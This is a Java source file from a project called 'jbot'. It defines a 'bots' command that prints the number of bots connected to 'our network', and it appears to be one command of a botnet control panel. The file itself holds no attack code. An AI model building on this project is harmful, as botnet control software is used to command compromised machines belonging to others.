package me.aaronakhtar.jbot.command_manager.commands;

import me.aaronakhtar.jbot.Main;
import me.aaronakhtar.jbot.Utilities;
import me.aaronakhtar.jbot.command_manager.JBotCommand;
import me.aaronakhtar.jbot.threads.handlers.ClientHandler;

import java.io.BufferedReader;
import java.io.BufferedWriter;

public class BotsCommand implements JBotCommand {

    @Override
    public String getCommand() {
        return "bots";
    }

    @Override
    public String getDescription() {
        return "view total bots connected to our network.";
    }

    @Override
    public boolean isAdminCommand() {
        return false;
    }

    @Override
    public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {
        out.write(Utilities.Colour.YELLOW.get() + "Total Bots Connected: "+ Utilities.Colour.MAGENTA_BG.get() + Main.connectedBots.size() +"\r\n");
        out.flush();
    }
}
